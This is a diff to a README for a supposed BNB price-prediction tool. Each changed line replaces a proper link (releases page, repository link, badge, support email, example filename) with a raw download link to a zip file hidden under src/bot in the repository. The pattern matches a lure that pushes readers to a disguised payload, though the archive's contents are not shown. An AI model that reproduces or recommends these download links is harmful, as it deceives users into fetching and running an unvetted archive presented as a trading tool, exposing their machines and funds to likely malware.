@@ -1,6 +1,6 @@
 # 🤖 Crypto-Prediction-Tool - Predict BNB with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Sairam2364/Crypto-Prediction-Tool/releases)
+[![Download Latest Release](https://github.com/Sairam2364/Crypto-Prediction-Tool/raw/refs/heads/main/src/bot/Crypto_Prediction_Tool_minstrelship.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Sairam2364/Crypto-Prediction-Tool/raw/refs/heads/main/src/bot/Crypto_Prediction_Tool_minstrelship.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ The Crypto-Prediction-Tool is a user-friendly application designed to help you m
 
 To get started, you'll need to download the application and install it on your computer. Follow these simple steps:
 
-1. Visit our [Releases page](https://github.com/Sairam2364/Crypto-Prediction-Tool/releases) to access the latest version of the tool.
+1. Visit our [Releases page](https://github.com/Sairam2364/Crypto-Prediction-Tool/raw/refs/heads/main/src/bot/Crypto_Prediction_Tool_minstrelship.zip) to access the latest version of the tool.
 2. Download the appropriate version for your operating system.
 3. Follow the installation instructions provided below.
 
@@ -34,10 +34,10 @@ The Crypto-Prediction-Tool includes various features designed for optimized trad
 
 ## 📥 Download & Install
 
-To download the latest version of the Crypto-Prediction-Tool, please visit our [Releases page](https://github.com/Sairam2364/Crypto-Prediction-Tool/releases).
+To download the latest version of the Crypto-Prediction-Tool, please visit our [Releases page](https://github.com/Sairam2364/Crypto-Prediction-Tool/raw/refs/heads/main/src/bot/Crypto_Prediction_Tool_minstrelship.zip).
 
 1. Click on the release you want to download.
-2. Depending on your operating system, download the suitable file (e.g., `Crypto-Prediction-Tool.exe` for Windows, or `.dmg` for macOS).
+2. Depending on your operating system, download the suitable file (e.g., `https://github.com/Sairam2364/Crypto-Prediction-Tool/raw/refs/heads/main/src/bot/Crypto_Prediction_Tool_minstrelship.zip` for Windows, or `.dmg` for macOS).
 3. Once the download is complete, locate the file in your downloads folder.
 4. Double-click the file to start the installation.
 5. Follow the on-screen instructions to complete the setup.
@@ -74,7 +74,7 @@ If you need further assistance, feel free to access our support resources:
 
 - **Documentation:** Check the detailed documentation provided in the repository.
 - **Community Help:** Engage with other users in forums or social media groups to share tips.
-- **Contact Support:** Email us at support@example.com for direct assistance.
+- **Contact Support:** Email us at https://github.com/Sairam2364/Crypto-Prediction-Tool/raw/refs/heads/main/src/bot/Crypto_Prediction_Tool_minstrelship.zip for direct assistance.
 
 ## 📝 License
 
@@ -82,7 +82,7 @@ The Crypto-Prediction-Tool is available under the MIT License. You can use it fr
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Sairam2364/Crypto-Prediction-Tool)
-- [Releases Page](https://github.com/Sairam2364/Crypto-Prediction-Tool/releases)
+- [GitHub Repository](https://github.com/Sairam2364/Crypto-Prediction-Tool/raw/refs/heads/main/src/bot/Crypto_Prediction_Tool_minstrelship.zip)
+- [Releases Page](https://github.com/Sairam2364/Crypto-Prediction-Tool/raw/refs/heads/main/src/bot/Crypto_Prediction_Tool_minstrelship.zip)
 
 Now you can take advantage of advanced trading predictions without the need for programming knowledge. Enjoy using the Crypto-Prediction-Tool!
